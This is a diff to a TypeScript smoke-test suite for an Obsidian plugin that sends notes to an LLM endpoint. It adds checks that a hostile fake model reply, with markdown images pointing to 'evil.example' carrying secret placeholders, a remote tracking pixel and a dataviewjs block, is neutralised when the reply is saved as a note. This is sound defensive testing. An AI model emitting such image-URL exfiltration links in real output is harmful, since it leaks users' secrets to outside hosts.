@@ -947,7 +947,7 @@ const MANAGER_PLUGIN_ID = "llm-endpoint-manager";
 const MANAGER_DEFAULT_MODEL = "smoke-manager-model";
 const LOCAL_FALLBACK_MODEL = "smoke-lokal-modell";
 
-interface FakeChatEndpoint { url: string; close: () => Promise<void>; chatCalls: () => number; lastModel: () => string | null; lastBody: () => Record<string, unknown> | null; lastAuth: () => string | null }
+interface FakeChatEndpoint { url: string; close: () => Promise<void>; chatCalls: () => number; lastModel: () => string | null; lastBody: () => Record<string, unknown> | null; lastAuth: () => string | null; pixelCalls: () => number }
 
 /** Eigener Mini-HTTP-Server statt eines echten LLM-Servers oder des echten Manager-Plugins —
  *  M1-M3 pruefen die KONSUMENTEN-Seite (resolveLlmEndpoint()/findEndpointManager() in
@@ -959,6 +959,7 @@ async function startFakeChatEndpoint(modelId: string, antwort?: (body: Record<st
   let lastModel: string | null = null;
   let lastBody: Record<string, unknown> | null = null;
   let lastAuth: string | null = null;
+  let pixelCalls = 0;
   const server = createServer((req, res) => {
     // Der Renderer laeuft unter app://obsidian.md — ohne CORS-Header blockt der Browser den
     // Preflight (OPTIONS) und die eigentliche Anfrage sieht der Server nie.
@@ -969,6 +970,13 @@ async function startFakeChatEndpoint(modelId: string, antwort?: (body: Record<st
     if (req.url?.includes("/v1/models") === true) {
       res.writeHead(200, { "Content-Type": "application/json" });
       res.end(JSON.stringify({ data: [{ id: modelId, object: "model" }] }));
+      return;
+    }
+    // V7/V8: ein Fernbild, das die Notiz von selbst laedt, landet hier — der Zaehler misst am Draht.
+    if (req.method === "GET" && req.url?.startsWith("/pixel") === true) {
+      pixelCalls += 1;
+      res.writeHead(200, { "Content-Type": "image/gif" });
+      res.end(Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64"));
       return;
     }
     if (req.method === "POST" && req.url?.includes("/v1/chat/completions") === true) {
@@ -1000,6 +1008,7 @@ async function startFakeChatEndpoint(modelId: string, antwort?: (body: Record<st
     lastModel: () => lastModel,
     lastBody: () => lastBody,
     lastAuth: () => lastAuth,
+    pixelCalls: () => pixelCalls,
   };
 }
 
@@ -1327,7 +1336,7 @@ const V_GEHEIMNIS = "abcdefghijklmnop12345678";   // >= 16 Zeichen, sonst greift
 const V_SK = "sk-abcdefghijklmnop1234";          // ohne Leerzeichen: steht als URL-Teil in einer Markdown-Bild-Syntax
 const V_ZEILEN_SCHLUESSEL = "smoke-v5-schluessel";
 
-async function pruefeSchutz(cdp: Cdp): Promise<void> {
+async function pruefeSchutz(cdp: Cdp, aufraeumen: string[]): Promise<void> {
   console.log("\nV · Verbindung: Schluessel je Zeile, Schwaerzung, Neutralisierung");
   const NAMEN = [
     "V1 Zeile mit Klartext-Schluessel: nach resolve steht kein apiKey mehr in data.json, der Wert im Schluesselbund",
@@ -1336,6 +1345,8 @@ async function pruefeSchutz(cdp: Cdp): Promise<void> {
     "V4 Die Deutung zeigt das Original wieder (Schwaerzung ist umkehrbar)",
     "V5 Eine Antwort mit Bild-URL und Platzhalter erzeugt kein img-Element",
     "V6 Ein dataviewjs-Block in der Antwort rendert als Text, nicht als Codeblock",
+    "V7 Die gespeicherte Notiz traegt die entschaerfte Form (```text statt ```dataviewjs, kein Fernbild), kein dataviewjs-Code im DOM",
+    "V8 Die gespeicherte Notiz laedt das Fernbild nicht (Zaehler am Draht bleibt 0)",
   ];
   const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
   let fake: FakeChatEndpoint | null = null;
@@ -1347,10 +1358,11 @@ async function pruefeSchutz(cdp: Cdp): Promise<void> {
       // Gegenprobe auch einen Platzhalter trifft, dessen Original keine Leerzeichen traegt) und als dataviewjs-Block.
       const platzhalter = [...JSON.stringify(body.messages).matchAll(/\[redacted-[a-z-]+-\d+\]/g)].map((m) => m[0]);
       const liste = platzhalter.length ? platzhalter : ["(kein Platzhalter gesehen)"];
-      return `Echo ${liste.join(" ")}\n\n${liste.map((p) => `![x](https://evil.example/?d=${p})`).join("\n")}\n\n\`\`\`dataviewjs\ndv.paragraph("smoke")\n\`\`\`\n`;
+      const pixel = fake ? `![p](${fake.url}/pixel?d=1)\n\n` : "";
+      return `Echo ${liste.join(" ")}\n\n${pixel}${liste.map((p) => `![x](https://evil.example/?d=${p})`).join("\n")}\n\n\`\`\`dataviewjs\ndv.paragraph("smoke")\n\`\`\`\n`;
     });
     console.log(`  Fake-Endpunkt: ${fake.url}`);
-    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, model: l.model, choice: l.choice ?? null };`);
+    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, model: l.model, choice: l.choice ?? null, out: ${P}.settings.defaultOutput };`);
     // Ein Endpunkt MIT Klartext-Schluessel (ein Staging-Vault ohne Schluessel misst sonst nichts),
     // dann resolve({ force: true }) — erst das migriert in den Schluesselbund und speichert.
     await cdp.evaluate(`
@@ -1385,6 +1397,27 @@ async function pruefeSchutz(cdp: Cdp): Promise<void> {
     record(NAMEN[3]!, ok && dom.text.includes(V_GEHEIMNIS) && dom.text.includes(V_SK), ok ? `Deutung enthaelt beide Originale: ${dom.text.includes(V_GEHEIMNIS) && dom.text.includes(V_SK) ? "ja" : "nein"}` : "kein Ergebnis");
     record(NAMEN[4]!, ok && dom.imgs === 0 && dom.evilImg === 0, `img-Elemente: ${dom.imgs}, Elemente mit evil.example-Quelle: ${dom.evilImg}`);
     record(NAMEN[5]!, ok && dom.codeblock === 0 && dom.text.includes("dataviewjs"), `pre/code/dataviewjs-Elemente: ${dom.codeblock}, Text enthaelt „dataviewjs“: ${dom.text.includes("dataviewjs") ? "ja" : "nein"}`);
+
+    // V7/V8: dieselbe Deutung speichern. Die Notiz oeffnet sich sofort (openAfterCreate), Live Preview laedt
+    // Fernbilder schon vor der Leseansicht — deshalb misst V8 am Draht, nicht im DOM. Im Staging-Vault ist kein
+    // Dataview installiert: V7 prueft die Form der Datei, nicht ein Nicht-Ausfuehren.
+    const pixelVorher = fake.pixelCalls();
+    const dateienVorher = await cdp.evaluate<string[]>(`return app.vault.getMarkdownFiles().map((f) => f.path);`);
+    await cdp.evaluate(`${P}.settings.defaultOutput = "note"; ${P}.settings.openAfterCreate = true; return true;`);
+    const gespeichert = ok && await clickPanelButton(cdp, ".yijing-interpretation-inner .yijing-actions button");
+    await schlaf(3000);
+    const dateienNachher = await cdp.evaluate<string[]>(`return app.vault.getMarkdownFiles().map((f) => f.path);`);
+    const neu = dateienNachher.filter((f) => !dateienVorher.includes(f));
+    for (const f of neu) aufraeumen.push(f);
+    const notiz = neu.length === 1 ? await cdp.evaluate<string>(`return await app.vault.read(app.vault.getAbstractFileByPath(${JSON.stringify(neu[0])}));`) : "";
+    const leaf = await cdp.evaluate<{ kopf: boolean; dvjs: number }>(`
+      const v = document.querySelector(".workspace-leaf.mod-active .view-content");
+      return { kopf: Boolean(v && /AI Interpretation|KI-Deutung/.test(v.textContent ?? "")), dvjs: v ? v.querySelectorAll("code.language-dataviewjs, .language-dataviewjs").length : -1 };`);
+    const form = notiz.includes("```text") && !notiz.includes("```dataviewjs") && !notiz.includes("![p](") && !notiz.includes("![x](");
+    record(NAMEN[6]!, gespeichert && neu.length === 1 && form && leaf.kopf && leaf.dvjs === 0,
+      `neue Notizen: ${neu.length}, Fence text: ${notiz.includes("```text") ? "ja" : "nein"}, Fence dataviewjs in Datei: ${notiz.includes("```dataviewjs") ? "JA" : "nein"}, Fernbild-Syntax in Datei: ${/!\[[px]\]\(/.test(notiz) ? "JA" : "nein"}, Ueberschrift gerendert (Positivkontrolle): ${leaf.kopf ? "ja" : "nein"}, code.language-dataviewjs im DOM: ${leaf.dvjs}`);
+    record(NAMEN[7]!, gespeichert && neu.length === 1 && leaf.kopf && pixelVorher === 0 && fake.pixelCalls() === 0,
+      `GET /pixel am Fake-Server: ${pixelVorher} vor, ${fake.pixelCalls()} nach dem Speichern`);
   } catch (e) {
     for (const n of NAMEN) if (!checks.some((c) => c.name === n)) skipped(n, `Messung abgebrochen: ${(e as Error).message}`);
   } finally {
@@ -1392,7 +1425,7 @@ async function pruefeSchutz(cdp: Cdp): Promise<void> {
     if (vorher !== null) {
       await cdp.evaluate(`
         const v = ${JSON.stringify(vorher)}; const p = ${P};
-        p.settings.llm.endpoints = v.eps; p.settings.llm.model = v.model;
+        p.settings.llm.endpoints = v.eps; p.settings.llm.model = v.model; p.settings.defaultOutput = v.out;
         if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
         p.llm.invalidate(); await p.saveSettings();
         return true;`).catch(() => null);
@@ -1633,7 +1666,7 @@ async function main(): Promise<void> {
     await abschnittDeklarativ(cdp, port);
     if (!argv.includes("--kein-manager")) await pruefeManager(cdp, port);
     await pruefeAnfrage(cdp, port);
-    await pruefeSchutz(cdp);
+    await pruefeSchutz(cdp, aufraeumen);
     await pruefeEchtenEndpunkt(cdp);
 
     if (keinBild) {
